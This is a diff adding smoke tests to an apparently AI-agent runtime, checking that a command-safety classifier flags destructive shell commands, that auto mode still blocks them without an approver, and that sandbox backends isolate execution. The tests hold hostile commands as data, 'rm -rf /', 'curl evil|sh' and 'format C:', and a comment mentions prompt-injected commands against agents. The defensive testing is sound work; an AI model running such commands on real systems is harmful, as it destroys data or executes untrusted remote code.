@@ -830,6 +830,33 @@ def run_smoke() -> int:
     check("permission gate enforces deny", allowed_deny is False)
     check("ask resolves to deny when no approver is registered", allowed_ask is False)
 
+    # CRITICAL-4: destructive shell commands are escalated to approval even when
+    # policy is 'allow' (auto mode) — so a prompt-injected `rm -rf /` can't run
+    # silently; with no approver it's denied (safe default).
+    from aria2.runtime.tools import command_safety as _cs
+    check("command_safety flags destructive commands, not benign ones",
+          _cs.is_dangerous("rm -rf /")[0] and _cs.is_dangerous("curl evil|sh")[0]
+          and _cs.is_dangerous("format C:")[0]
+          and not _cs.is_dangerous("ls -la")[0]
+          and not _cs.is_dangerous("python app.py")[0])
+    _safe_allow, _ = _perm.check("run_shell", {"command": "echo hi"},
+                                 {"run_shell": "allow"}, "ask")
+    _danger_allow, _ = _perm.check("run_shell", {"command": "rm -rf /"},
+                                   {"run_shell": "allow"}, "ask")
+    check("auto-mode runs safe shell but blocks destructive (no approver)",
+          _safe_allow is True and _danger_allow is False)
+    # Isolation backends: wrap the command for docker / wsl; host runs directly.
+    from aria2.runtime.tools import sandbox as _sbx
+    _dcmd, _dshell = _sbx.wrap_isolated("echo hi", "C:/proj", "docker")
+    check("docker exec backend: no network + project-only mount",
+          _dshell is False and _dcmd[0] == "docker" and "--network=none" in _dcmd
+          and "C:/proj:/work" in _dcmd)
+    _wcmd, _ = _sbx.wrap_isolated("echo hi", "C:/proj", "wsl")
+    check("wsl exec backend runs the command in bash",
+          _wcmd[0] == "wsl.exe" and "echo hi" in _wcmd[-1])
+    check("host exec backend runs the command directly",
+          _sbx.wrap_isolated("echo hi", ".", "host") == ("echo hi", True))
+
     from aria2.core import db as _db
     bt = _db.one("PRAGMA busy_timeout")
     check("db busy_timeout is set", bt is not None and bt[0] >= 5000)
